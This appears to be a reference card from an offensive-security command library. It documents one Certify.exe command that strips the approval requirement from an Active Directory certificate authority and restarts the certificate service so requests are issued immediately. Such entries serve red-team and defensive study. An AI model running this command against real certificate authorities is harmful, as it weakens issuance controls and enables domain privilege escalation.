---
type: command
executor: powershell
data: Certify.exe setconfig /removeapproval /restart
output: null
platforms:
  - Windows
tags:
  - adcs
  - configuration
verified: true
validated: true
---

# certify-disable-approval-requirement

## Command

```powershell
Certify.exe setconfig /removeapproval /restart
```

## Description

Removes the pending approval requirement for certificate requests on the CA, allowing immediate issuance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| /removeapproval | Disables approval for requests | Yes |
| /restart | Restarts certsvc service | Yes |

## Examples

### Basic Usage

```powershell
Certify.exe setconfig /removeapproval /restart
```

## Expected Output

"Approval requirement removed. Service restarted."

## Related

- [[procedures/Vulnerable-Certificate-Authority-Access-Control]]
